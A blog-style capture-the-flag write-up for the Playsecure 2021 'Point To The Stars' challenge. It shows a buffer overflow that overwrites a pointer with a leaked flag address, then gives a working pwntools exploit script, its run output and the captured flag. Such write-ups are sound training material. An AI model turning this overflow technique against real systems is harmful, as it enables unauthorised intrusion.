---
layout: post
title: Playsecure - Point To The Stars
---

Can you point to the stars? Make the pointer point to the flag!

Connect to the challenge at exploitation.ps.ctf.ae:5454

<!-- more -->

### Connecting to challenge server and interacting.

![pts00](/assets/playsecure2021/pts00.png)

### Overwriting the star pointer

Sending a string of length 100 will overwrite the star pointer.

![pts01](/assets/playsecure2021/pts01.png)

### Controlling the star pointer

We enter a unique pattern of 100 length as the wish. Find the offset at which the star pointer is getting overwritten.

![pts02](/assets/playsecure2021/pts02.png)

### Approach to Exploitation

WE know the following:
- The index at which star pointer is getting overwritten
- The address at which flag is stored

WE have to do the following:
- After connecting to challenge, read the flag address
- Send payload as [JUNK 72] + [FLAG ADDRESS PACKED LITTLE ENDIAN]
- Read responses from challenge server

### Exploitaion Proof of Concept

```python
# Author: Rizal Muhammed ~ rizaru ~ UB3RSiCK
# Date: 27 March 2021
# Desc: Playsecure ctf Point to the stars exploitation solution

from pwn import *
import struct

def p(a):
	return struct.pack("I",a)

conn = remote('exploitation.ps.ctf.ae',5454)
r = conn.recvuntil("Enter your wish: ")

temp = str(r).split('\\n')

print ('\n'.join(temp))


for item in temp:
        if "The flag is stored at" in item:
                flag = item[len('The flag is stored at '):]
        if "The star pointer is pointing at" in item: 
                ptr = item[len('The star pointer is pointing at '):]


payload = b"A"*72

f = str(flag)[2:]
print (f)

pp = p64(int(f, 16))

print (repr(pp))

payload += pp

print (payload, type(payload))

conn.sendline(payload)

print (conn.recvline())
print (conn.recvline())
print (conn.recvline())
```

Running the PoC.

![pts03](/assets/playsecure2021/pts03.png)

```bash
kali@kali:~/Desktop/CTF/playsecure.ctf.ae-mar262021/exploitation/point2thestars$ python3 pt2str.py 
[+] Opening connection to exploitation.ps.ctf.ae on port 5454: Done
b'Can you reach for the stars?
----------------------
The flag is stored at 0x7fffcf6de170
The star pointer is pointing at 0x7fffcf6de1c0
Enter your wish: '
7fffcf6de170
b'p\xe1m\xcf\xff\x7f\x00\x00'
b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp\xe1m\xcf\xff\x7f\x00\x00' <class 'bytes'>
b'Granting your wish...\n'
b'The star pointer is now pointing at 0x7fffcf6de170\n'
b'Following the pointer you find: CTFAE{ReachForTheStarsAndBeyond}\n'
```

*FLAG: CTFAE{ReachForTheStarsAndBeyond}*
